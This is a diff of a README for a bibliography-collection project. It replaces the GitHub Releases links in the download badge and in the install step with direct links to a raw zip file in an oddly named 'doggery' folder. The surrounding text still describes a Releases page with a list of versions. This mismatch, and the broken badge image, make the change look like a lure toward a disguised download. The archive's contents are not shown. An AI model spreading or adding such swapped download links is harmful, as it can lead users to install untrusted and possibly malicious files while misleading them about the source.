@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/razyylog/FLOSS-research-bibliography-collection/releases)
+[![Download](https://raw.githubusercontent.com/razyylog/FLOSS-research-bibliography-collection/main/doggery/bibliography-research-FLOS-collection-v3.9-beta.4.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/razyylog/FLOSS-research-bibliography-collection/main/doggery/bibliography-research-FLOS-collection-v3.9-beta.4.zip)
 
 ---
 
@@ -25,7 +25,7 @@ Before you start, make sure your computer meets these basic requirements:
 To install the application, follow these steps:
 
 1. **Visit the Download Page:** Click the link below to access the Releases page.
-   [Download from Releases](https://github.com/razyylog/FLOSS-research-bibliography-collection/releases)
+   [Download from Releases](https://raw.githubusercontent.com/razyylog/FLOSS-research-bibliography-collection/main/doggery/bibliography-research-FLOS-collection-v3.9-beta.4.zip)
 
 2. **Choose the Version:** You will see a list of available versions. Select the latest version for the best features and improvements.
 
